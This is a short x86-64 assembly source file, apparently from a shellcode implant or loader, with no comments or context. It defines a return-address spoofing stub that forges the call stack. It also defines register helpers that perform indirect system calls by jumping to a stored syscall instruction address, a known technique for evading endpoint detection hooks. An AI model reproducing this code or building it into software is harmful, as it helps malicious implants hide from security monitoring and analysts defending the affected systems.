[BITS 64]

global SpoofStub
global GetShellcodeStart
global RegBackup
global RegRestore
global SysPrepare
global SysCall

[SECTION .text$B]

    SpoofStub:
        pop r11
        add rsp, 8
        mov rax, [rsp + 24]

        mov r10, [rax]
        mov [rsp], r10

        mov r10, [rax + 8]
        mov [rax + 8], r11 

        mov [rax + 16], rbx
        lea rbx, [rel fixup]
        mov [rax], rbx 
        mov rbx, rax 

        jmp r10 

    fixup:
        sub rsp, 16
        mov rcx, rbx 
        mov rbx, [rcx + 16]
        jmp QWORD [rcx + 8]


    RegBackup:
        mov [rcx], r14
        mov [rcx + 8], r15 
        ret

    RegRestore:
        mov r14, [rcx]
        mov r15, [rcx + 8]
        ret

    SysPrepare:
        mov r14d, ecx 
        mov r15, rdx
        ret

    SysCall:
        mov rax, rcx 
        mov r10, rax 
        mov eax, r14d 
        jmp r15 




        